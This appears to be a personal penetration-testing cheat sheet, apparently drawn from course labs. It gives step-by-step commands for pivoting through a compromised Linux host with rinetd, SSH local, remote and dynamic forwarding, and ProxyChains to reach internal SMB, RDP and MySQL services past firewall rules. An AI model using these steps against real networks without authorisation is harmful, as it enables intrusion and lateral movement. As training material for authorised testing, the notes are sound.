---
id: activeinformationgathering
tags: [bash, cheatsheet]
created: 2023-01-26
---
# active-information-gathering

backlinks: [[snippets-bash]]

sources:

- <https://github.com/danielmiessler/SecLists>

- Port redirection and tunneling
  - Tunneling a protocol involves encapsulating it within a different protocol. By using various tunneling techniques, we can carry a given protocol over an incompatible delivery network, or provide a secure path through an untrusted network
    - Port forwarding is the simplest traffic manipulation technique we will examine in which we redirect traffic destined for one IP address and port to another IP address and port.
      - In this fairly-common scenario, our first target, the Linux web server, has Internet connectivity, but the second machine, the Linux client, does not. We were only able to access this client by pivoting through the Internet-connected server. In order to pivot again, this time from the Linux client, and begin assessing other machines on the internal network, we must be able to transfer tools from our attack machine and exfiltrate data to it as needed. Since this client can not reach the Internet directly, we must use the compromised Linux web server as a go-between, moving data twice and creating a very tedious data-transfer process. 
      ![Alt text](_archive/_prebravo/offsec/pen200/20-PortTunnelling/rinetd.svg)
      - foothold machine is compromised linux web server
      - victim is blocked from any accessing the internet (ping does not work)
      - foothold installs rinetd ```shell sudo apt install rinetd```
      - foothold modifies ```sudo nano -ilm /etc/rinetd.conf``` file and adds a new rule below the line ``` # bindadress    bindport  connectaddress  connectport```
        - ```10.10.10.11  80  192.168.5.5 3389```
        - bindaddress = the servers address
        - bindport    = the port that is accessible to attacker
        - connectaddress  = the target ip address 
        - connectport     = the port to connect on
        - therefore any traffic on port 80 on 10.10.10.11 will be redirected to port 3389 on 192.168.5.5
      - foothold restarts service ```service rinetd restart```
      - attacker - ```shell rdesktop -u student -p lab 10.10.10.11:80 -5 -K -r clipboard:CLIPBOARD```
    - SSH tunneling
      - The SSH protocol1 is one of the most popular protocols for tunneling and port forwarding.2 This is due to its ability to create encrypted tunnels within the SSH protocol, which supports bi-directional communication channels. This obscure feature of the SSH protocol has far-reaching implications for both penetration testers and system administrators.
      - SSH Local Port Forwarding
        - SSH local port forwarding allows us to tunnel a local port to a remote server using SSH as the transport protocol. The effects of this technique are similar to rinetd port forwarding, with a few twists.
        - We have compromised a Linux-based target through a remote vulnerability, elevated our privileges to root, and gained access to the passwords for both the root and student users on the machine. This compromised machine (foothold) does not appear to have any outbound traffic filtering, and it only exposes SSH (port 22), RDP (port 3389), and the vulnerable service port, which are also allowed on the firewall. After enumerating the compromised Linux client, we discover that in addition to being connected to the current network (10.11.0.x), it has another network interface that seems to be connected to a different network (192.168.1.x). In this internal subnet, we identify a Windows Server 2016 machine (target) that has network shares available.
        - because windows may no longer support SMBv1, we need to update our samba config
          - ```shell sudo nano /etc/samba/smb.conf```
          - last line ```shell min protocol = SMB2```
          - restart ```shell sudo /etc/init.d/smbd restart```
        - foothold is our compromised linux machine 10.11.0.128
        - target is windows server 2016 192.168.1.110 smb share
        - attacker machine sets up ssh with no commands -N, then set up port forwarding (with -L), bind port 445 on our local machine (0.0.0.0:445) to port 445 on the Windows Server (target) (192.168.1.110:445) and do this through a session to our original Linux target (foothold), logging in as student (student@10.11.0.128)
        - ```shell sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128
        - any incoming connection on the Kali Linux box on TCP port 445 will be forwarded to TCP port 445 on the 192.168.1.110 IP address through our compromised Linux client.
        - connect using smbclient ```shell smbclient -L 127.0.0.1 -U Administrator```
      - SSH Remote Port Forwarding
        - The remote port forwarding feature in SSH can be thought of as the reverse of local port forwarding, in that a port is opened on the remote side of the connection and traffic sent to that port is forwarded to a port on our local machine (the machine initiating the SSH client).
        - In short, connections to the specified TCP port on the remote host will be forwarded to the specified port on the local machine. This can be best demonstrated with a new scenario.
        - In this case, we have access to a non-root shell on a Linux client on the internal network. On this compromised machine, we discover that a MySQL server is running on TCP port 3306. Unlike the previous scenario, the firewall is blocking inbound TCP port 22 (SSH) connections, so we can't SSH into this server from our Internet-connected Kali machine.
        - We can, however, SSH from this server out to our Kali attacking machine, since outbound TCP port 22 is allowed through the firewall.
        -  We can leverage SSH remote port forwarding (invoked with ssh -R) to open a port on our Kali machine that forwards traffic to the MySQL port (TCP 3306) on the internal server. All forwarded traffic will traverse the SSH tunnel, right through the firewall.
        - In this case, we will ssh out to our Kali machine as the kali user (kali@10.11.0.4), specify no commands (-N), and a remote forward (-R). We will open a listener on TCP port 2221 on our Kali machine (10.11.0.4:2221) and forward connections to the internal Linux machine's TCP port 3306 (127.0.0.1:3306):
          - on foothold
          - ```shell ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4```
          - This will forward all incoming traffic on our Kali system's local port 2221 to port 3306 on the compromised box through an SSH tunnel (TCP 22), allowing us to reach the MySQL port even though it is filtered at the firewall.
          - verify port is open ```shell ss -antp | grep "2221"```
          - then we can nmap targetting 127.0.0.1:2221 which will
            - ```shell sudo nmap -sS -sV 127.0.0.1 -p 2221```
      - SSH Dynamic Port forwarding
        - SSH dynamic port forwarding allows us to set a local listening port and have it tunnel incoming traffic to any remote destination through the use of a proxy.
        - In this scenario (similar to the one used in the SSH local port forwarding section), we have compromised a Linux-based target and have elevated our privileges. There do not seem to be any inbound or outbound traffic restrictions on the firewall.
        - After further enumeration of the compromised Linux client, we discover that in addition to being connected to the current network (10.11.0.x), it has an additional network interface that seems to be connected to a different network (192.168.1.x). On this internal subnet, we have identified a Windows Server 2016 machine that has network shares available.
        - In the local port forwarding section, we managed to interact with the available shares on the Windows Server 2016 machine; however, that technique was limited to a particular IP address and port. In this example, we would like to target additional ports on the Windows Server 2016 machine, or hosts on the internal network without having to establish different tunnels for each port or host of interest.
        - we can use ssh -D to specify local dynamic SOCKS4 application-level port forwarding (again tunneled within SSH) with the following syntax:
          - ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>
        - With the above syntax in mind, we can create a local SOCKS4 application proxy (-N -D) on our Kali Linux machine on TCP port 8080 (127.0.0.1:8080), which will tunnel all incoming traffic to any host in the target network, through the compromised Linux machine, which we log into as student (student@10.11.0.128):
          - ```shell sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128```
        - through the SSH tunnel, we must somehow direct our reconnaissance and attack tools to use this proxy. We can run any network application through HTTP, SOCKS4, and SOCKS5 proxies with the help of ProxyChains.
          - ```shell sudo nano -ilm /etc/proxychains.conf```
          - add a line under [ProxyList] ```socks5 	127.0.0.1 8080 ```
        - now we prepend all commands with proxychains
          - ```shell sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110```
          - 

